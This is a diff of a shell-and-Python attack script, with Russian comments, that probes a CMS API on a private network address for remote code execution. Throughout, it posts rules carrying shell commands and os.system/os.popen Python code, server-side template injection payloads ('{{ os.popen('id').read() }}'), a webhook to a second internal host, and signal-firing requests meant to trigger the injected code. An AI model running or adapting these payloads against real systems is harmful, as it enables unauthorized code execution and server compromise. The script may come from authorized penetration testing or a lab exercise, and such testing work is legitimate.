@@ -1,42 +1,36 @@
-echo "=== CMS: CREATE RULE (code exec попытка) ==="
-python3 << 'RULE'
+echo "=== FIRE SIGNAL (правильный формат) ==="
+python3 << 'FIRE'
 import urllib.request,json
 B="http://192.168.3.121:8000"
-# 1. Создаём правило с Jinja2/Python инъекцией
+# Fire signal с правильным форматом
 for payload in [
-    {"name":"cxp-test","trigger":{"type":"manual"},"action":{"type":"webhook","url":"http://192.168.3.14:8080/cxp"}},
-    {"name":"cxp-test2","trigger":{"type":"signal"},"action":{"type":"shell","command":"id"}},
-    {"name":"cxp-test3","trigger":{"type":"content.created"},"action":{"type":"code","code":"import os;os.system('id')"}},
+    {"signal_name":"manual"},
+    {"signal_name":"manual","context":{"cmd":"id"}},
+    {"signal_name":"cxp-test2"},
+    {"signal_name":"trigger","content_id":1},
 ]:
-    req=urllib.request.Request(B+"/api/v1/rules",data=json.dumps(payload).encode(),
+    req=urllib.request.Request(B+"/api/v1/rules/signals/fire",
+        data=json.dumps(payload).encode(),
         headers={"Content-Type":"application/json"})
     try:
-        r=urllib.request.urlopen(req,timeout=8)
-        print(f"RULE-CREATE {payload['name']}: {r.status} {r.read()[:200]}")
+        r=urllib.request.urlopen(req,timeout=10)
+        print(f"FIRE {payload['signal_name']}: {r.status} {r.read()[:300]}")
     except urllib.error.HTTPError as e:
-        print(f"RULE-CREATE {payload['name']}: {e.code} {e.read()[:150]}")
-# 2. Создаём content с Jinja2 SSTI
-content_payload={
-    "typeName":"article",
-    "slug":"cxp-ssti-test",
-    "status":"draft",
-    "data":{"title":"{{7*7}}","body":"${7*7} <%= 7*7 %> {% import os %}{{ os.popen('id').read() }}"}
-}
-req=urllib.request.Request(B+"/api/v1/content",data=json.dumps(content_payload).encode(),
-    headers={"Content-Type":"application/json"})
+        print(f"FIRE {payload['signal_name']}: {e.code} {e.read()[:200]}")
+# Также: PUT rule с Python кодом
+rule_code={"name":"cxp-exec","codeType":"python","conditionType":"expression","conditionExpr":"True","actionCode":"import os; result = os.popen('id; hostname; whoami').read()"}
+req=urllib.request.Request(B+"/api/v1/rules/3",data=json.dumps(rule_code).encode(),
+    headers={"Content-Type":"application/json"},method="PUT")
 try:
     r=urllib.request.urlopen(req,timeout=8)
-    print(f"CONTENT-CREATE: {r.status} {r.read()[:200]}")
+    print(f"RULE-UPDATE: {r.status} {r.read()[:200]}")
 except urllib.error.HTTPError as e:
-    print(f"CONTENT-CREATE: {e.code} {e.read()[:200]}")
-# 3. Fire signal
-signal={"signal_type":"manual","payload":{"cmd":"id"}}
-req=urllib.request.Request(B+"/api/v1/rules/signals/fire",data=json.dumps(signal).encode(),
-    headers={"Content-Type":"application/json"})
+    print(f"RULE-UPDATE: {e.code} {e.read()[:200]}")
+# GET rule 3 (что внутри)
+req=urllib.request.Request(B+"/api/v1/rules/3")
 try:
     r=urllib.request.urlopen(req,timeout=8)
-    print(f"SIGNAL-FIRE: {r.status} {r.read()[:200]}")
-except urllib.error.HTTPError as e:
-    print(f"SIGNAL-FIRE: {e.code} {e.read()[:200]}")
-RULE
-echo CMS-EXEC
+    print(f"RULE-GET: {r.read()[:300]}")
+except Exception as e: print(f"RULE-GET: {e}")
+FIRE
+echo FIRE-SIGNAL
